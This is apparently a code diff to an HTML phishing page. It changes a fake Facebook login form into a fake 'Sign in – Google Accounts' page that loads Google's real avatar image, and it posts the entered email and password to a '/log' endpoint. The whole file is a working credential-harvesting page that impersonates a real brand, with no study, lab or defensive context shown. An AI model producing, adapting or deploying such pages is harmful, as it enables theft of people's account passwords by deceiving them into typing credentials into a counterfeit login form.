@@ -1,12 +1,20 @@
 <!DOCTYPE html>
-<html>
-<head><title>Facebook – log in</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in – Google Accounts</title>
+  <link rel="stylesheet" href="style.css">
+</head>
 <body>
-  <h2>Facebook Login</h2>
-  <form action="/log" method="POST">
-    <input type="text" name="email" placeholder="Email or Phone"><br>
-    <input type="password" name="pass" placeholder="Password"><br>
-    <input type="submit" value="Log In">
-  </form>
+  <div class="login-box">
+    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="avatar" class="avatar">
+    <h2>Sign in</h2>
+    <p>to continue to Gmail</p>
+    <form action="/log" method="POST">
+      <input type="text" name="email" placeholder="Email or phone" required><br>
+      <input type="password" name="pass" placeholder="Enter your password" required><br>
+      <button type="submit">Next</button>
+    </form>
+  </div>
 </body>
 </html>
